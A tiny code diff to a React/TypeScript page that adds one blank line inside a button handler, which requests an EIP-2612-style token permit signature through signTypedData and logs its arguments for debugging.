@@ -90,6 +90,7 @@ const Page = () => {
 					<div className={'flex gap-2'}>
 						{token.contract_ticker_symbol}
 						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
+
 							const sig = await createPermitSignature(async (args: any)=>{
 									console.log('test',args);
 								return signTypedData(config, args);
